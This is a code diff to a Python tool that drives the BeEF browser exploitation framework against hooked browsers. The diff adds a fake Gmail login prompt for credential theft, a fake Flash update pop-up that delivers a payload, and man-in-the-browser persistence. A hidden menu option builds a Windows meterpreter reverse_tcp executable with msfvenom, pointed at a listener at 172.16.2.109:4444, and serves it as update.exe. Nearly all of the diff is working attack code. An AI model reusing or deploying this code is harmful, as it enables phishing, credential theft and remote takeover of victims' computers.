@@ -19,6 +19,7 @@ class Browser_Parser:
 		self.cert_cert = "/opt/beef/beefFramework.pem"
 		self.redirect_url = 'https://192.168.3.1/sheep.jpg'
 		self.hook = 'https://192.168.3.1:3000/hook.js'
+		self.exploit = None
 		self.browser_id = None
 		self.cert = (self.cert_cert, self.cert_key)
 		self.api_key = self.get_api_key()
@@ -26,6 +27,8 @@ class Browser_Parser:
 		self.account = None
 		self.toolbar_prompt_id = None
 		self.interface = MITM_Interface(self.user_id)
+		self.lhost = "172.16.2.109"
+		self.lport = "4444"
 		self.menu()
 
 	def get_api_key(self):
@@ -43,7 +46,7 @@ class Browser_Parser:
 		elif socnet_choice.lower() == 'linkedin':
 			socnet_choice, self.account = 'LinkedIn', 'linkedIn'
 		elif socnet_choice.lower() == 'youtube':
-			socnet_choice, self.account = 'YouTube', "youTube"
+			socnet_choice, self.account = 'YouTube', "youtube"
 		elif socnet_choice.lower() == 'generic':
 			socnet_choice, self.account = 'Generic', "generic"
 		else:
@@ -65,7 +68,7 @@ class Browser_Parser:
 	def prompt_gmail_login(self):
 		self.account = "Google"
 		hed = "Content-Type: application/json; charset=UTF-8"
-		to_beef_serv = {'xss_hook_uri': self.hook, 'logout_gmail__interval' : 10000, 'wait_seconds_before_redirect':2000 }
+		to_beef_serv = {'xss_hook_uri': self.hook, 'logout_gmail_interval' : 10000, 'wait_seconds_before_redirect':2000 }
 		k_une = requests.post(url="https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/262?token=" + str(self.api_key), cert=self.cert, verify=False, json=to_beef_serv)
 		k_dict = json.loads(k_une.text)
 		if k_dict['success'] == "true":
@@ -76,6 +79,55 @@ class Browser_Parser:
 		else:
 			print "prompt request unsucessful"
 			return None
+
+
+	def fake_flash_update(self, payload):
+		if self.browser_id is None:
+			print "find some browsers first"
+			return None
+		hed = "Content-Type: application/json; charset=UTF-8"
+		params = {"image": "https://192.168.3.1:3000/adobe/flash_update.png",
+					"payload": 'Custom_Payload',
+					"payload_uri": payload}
+		to_b = requests.post(url =  "https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/249?token=" + str(self.api_key),cert=self.cert, verify=False, json=params)
+		to_b = json.loads(to_b.text)
+		if to_b['success'] == "true":
+			print "fake flash pop-up sent..."
+			print 'command_id:' + str(to_b['command_id'])
+			self.toolbar_prompt_id = 249
+			self.browser_db_router.update_BrowserTable_Toolbar_Cmd(self.user_id, str(to_b['command_id']))
+		else:
+			print "prompt request unsucessful"
+			return None
+
+	def man_in_the_browser(self):
+		hed = "Content-Type: application/json; charset=UTF-8"
+		params = {"man_in_the_browser": ""}
+		to_b = requests.post(url =  "https://192.168.3.1:3000/api/modules/" + str(self.browser_id) +"/266?token=" + str(self.api_key),cert=self.cert, verify=False, json=params)
+		to_b = json.loads(to_b.text)
+		if to_b['success'] == "true":
+			print "mitb persistence..."
+		else:
+			print "mitb request unsucessful"
+			return None
+
+
+	def make_meterpreter_payload(self, operating_system):
+		'''
+			android: android/meterpreter/reverse_tcp  
+			windows : windows/meterpreter/reverse_tcp
+			mac : osx/x86/shell_reverse_tcp    
+		'''
+		if operating_system.lower() == "windows":
+			print "creating windows payload..."
+			os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost=" + self.lhost + " lport=" + self.lport + " -f exe -o /var/www/html/update.exe")
+			self.exploit = "https://192.168.3.1/update.exe"
+		else:	
+			print "please supply OS"
+			pass
+
+		
+
 
 
 	def fake_toolbar(self, redirect_url):
@@ -191,29 +243,9 @@ class Browser_Parser:
 
 	def get_module_deets(self):
 		#debug: helper to get details on modules, delete after use
-		det = requests.get(url="https://192.168.3.1:3000/api/modules/262?token=" + str(self.api_key), cert=self.cert, verify=False)
+		det = requests.get(url="https://192.168.3.1:3000/api/modules/266?token=" + str(self.api_key), cert=self.cert, verify=False)
 		pprint.pprint(json.loads(det.text)) 
 		# 242 --> pretty theft, 252 --> firefox fake notification, 256 --> chrome fake bar, 263 --> IE fake bar
-
-
-	def save_hooked_browser_details(self):
-		#get hooked browsers --> get browser details
-		return self.get_hooked_browsers()
-
-	def check_toolbars(self):
-		pass
-
-	def check_lastpass(self):
-		pass
-
-	def check_popup_blocker(self):
-		pass
-
-	def check_adblock(self):
-		pass
-
-	def check_antivirus(self): 
-		pass
 
 	def menu(self):
 			print("*****BROWSER ANALYZER*****")
@@ -226,13 +258,14 @@ class Browser_Parser:
 								"3.Display fake toolbar\n"\
 								"4.Save fake login results\n"\
 								"5.Save fake toolbar results\n"\
-								"6.Exit\n"\
-								"7.Gmail theft\n")
+								"6.Gmail theft\n"\
+								"7.Flash pop-up\n"\
+								"8.exit\n")
 				try:
 					resp = int(resp)
 				except ValueError:
 					pass
-				if resp not in range(0,9):
+				if resp not in range(0,10) and resp != 666:
 					pass
 				else:
 					picd = False
@@ -240,7 +273,8 @@ class Browser_Parser:
 				self.browser_db_router.show_browser_db(self.user_id)
 				self.menu()
 			elif resp == 1:
-				self.save_hooked_browser_details()
+				self.get_hooked_browsers()
+				self.man_in_the_browser()
 				self.menu()
 			elif resp == 2:
 				self.promt_fake_login()
@@ -255,12 +289,20 @@ class Browser_Parser:
 				self.get_toolbar_result()
 				self.menu()
 			elif resp == 6:
-				sys.exit(0)
-			elif resp == 7:
 				self.prompt_gmail_login()
 				self.menu()
-
+			elif resp == 7:
+				self.fake_flash_update(self.redirect_url)
+				self.menu()
+			elif resp == 8:
+				sys.exit()
+			elif resp == 666:
+				rusure = raw_input("[!] ARE YOU SURE YOU WANT TO DO THIS?")
+				if rusure.lower() == "yes":
+					self.make_meterpreter_payload("windows")
+					self.fake_flash_update(self.exploit)
+				self.menu()
 
 if __name__ == "__main__":
 	bp = Browser_Parser()
-	#bp.get_module_deets()
+
